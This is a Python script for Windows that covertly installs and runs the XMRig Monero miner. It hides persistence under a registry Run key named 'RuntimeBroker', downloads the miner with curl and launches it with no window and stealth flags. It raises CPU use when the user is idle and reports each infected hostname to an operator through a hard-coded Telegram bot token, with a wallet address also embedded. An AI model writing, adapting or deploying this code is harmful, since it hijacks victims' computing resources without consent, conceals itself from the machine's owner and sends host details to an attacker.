import subprocess  
import os  
import sys  
import time  
import winreg  
import ctypes  
from ctypes import wintypes  
import requests

# Mining Configuration  
POOL_URL = "stratum+tcp://gulf.mpool.pro:10128"
WALLET_ADDRESS = "49KxcqRUduJMEKj5Lo5GWT52wHJBuuvbZCYnnpoR2btvh3x4iVWtDqdAd3q7hbA8Ez4GwpCvbt7gR2dzHprzncKhFr3XuT6"  
WORKER_NAME = "adaptive_worker"
STEALTH_FLAGS = "--quiet --background --donate-level=0"  

# Telegram Bot Configuration  
TELEGRAM_BOT_TOKEN = "7284188215:AAFFiwsvXla-f2a644TJpt9hICbbhxxw9rs"  
TELEGRAM_CHAT_ID = "7781560881"  

# Constants for idle detection  
LAST_INPUT_CHECK_INTERVAL = 60  # Check every 60 seconds  
IDLE_THRESHOLD = 300  # 5 minutes (in seconds)  

class LASTINPUTINFO(ctypes.Structure):  
    _fields_ = [  
        ("cbSize", wintypes.UINT),  
        ("dwTime", wintypes.DWORD),  
    ]  

def get_idle_time():  
    last_input_info = LASTINPUTINFO()  
    last_input_info.cbSize = ctypes.sizeof(last_input_info)  
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input_info))  
    millis = ctypes.windll.kernel32.GetTickCount() - last_input_info.dwTime  
    return millis / 1000.0  # Convert to seconds  

def adjust_miner_cpu(high_performance=False):  
    cpu_usage = "--max-cpu-usage=90" if high_performance else "--max-cpu-usage=50"  
    return cpu_usage  

def send_telegram_alert(message):  
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"  
    payload = {  
        "chat_id": TELEGRAM_CHAT_ID,  
        "text": message,  
        "parse_mode": "Markdown"  
    }  
    requests.post(url, json=payload, timeout=10)  

def install_persistent():  
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)  
    winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, sys.executable)
    key.Close()     

def start_miner():  
    # Send Telegram alert upon execution  
    hostname = os.getenv("COMPUTERNAME", "UNKNOWN_HOST")  
    send_telegram_alert(f"🚀 *New Miner Connected!* \n\n- **Host:** `{hostname}`\n- **Wallet:** `{WALLET_ADDRESS}`")  

    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"  
    os.system(f"curl -s {miner_url} -o xmrig.zip && tar -xf xmrig.zip")  
    while True:  
        idle_time = get_idle_time()  
        high_performance = idle_time > IDLE_THRESHOLD  
        cpu_flag = adjust_miner_cpu(high_performance)  
        cmd = f"xmrig.exe -o {POOL_URL} -u {WALLET_ADDRESS}.{WORKER_NAME} {STEALTH_FLAGS} {cpu_flag}"  
        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)  
        time.sleep(LAST_INPUT_CHECK_INTERVAL)  

if __name__ == "__main__":  
    install_persistent()  
    start_miner()  